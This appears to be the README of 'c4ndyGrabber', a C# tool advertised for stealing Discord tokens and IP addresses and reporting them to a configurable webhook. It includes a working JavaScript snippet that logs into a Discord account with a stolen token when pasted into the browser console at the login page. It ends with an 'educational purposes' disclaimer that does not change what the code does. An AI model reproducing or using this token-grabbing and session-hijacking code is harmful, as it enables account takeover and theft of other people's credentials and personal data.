# c4ndyGrabber
C# Discord Token and IP grabber

Remember to change `webhook` otherwise the report wont be able to come.

### Login with token JS function

```
function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }

login("token")
```

> Paste it into console at login discord page

*Made only for educational purposes*
